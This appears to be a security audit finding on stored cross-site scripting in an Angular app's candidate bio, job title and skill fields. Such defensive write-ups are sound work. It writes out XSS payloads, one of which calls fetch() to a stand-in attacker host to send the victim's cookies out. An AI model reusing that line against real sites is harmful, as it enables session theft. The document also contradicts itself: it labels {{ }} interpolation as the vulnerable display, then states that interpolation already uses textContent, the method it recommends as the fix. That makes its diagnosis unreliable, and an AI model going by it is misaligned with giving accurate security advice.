ATTACK EXAMPLE:
===============

Input (stored in database):
  bio = '<img src=x onerror="fetch(''https://attacker.com/steal?cookie='' + document.cookie)">'
  job_title = '<svg onload="/* malicious code */">'
  skill_name = '<script>alert("XSS")</script>'

Current Display (VULNERABLE):
  <p>{{ candidate.bio }}</p>
  Result: <p><img src=x onerror="fetch(...)"></p> → XSS EXECUTED

Recommended Display (SAFE):
  <p [textContent]="candidate.bio"></p>
  Result: <p>&lt;img src=x onerror="..."&gt;</p> → Text only, safe

ROOT CAUSE:
===========
Angular's {{ }} interpolation uses textContent internally, but was not applied
consistently. Some fields use this safe method, others don't. The inconsistency
creates opportunities for oversight in new components.
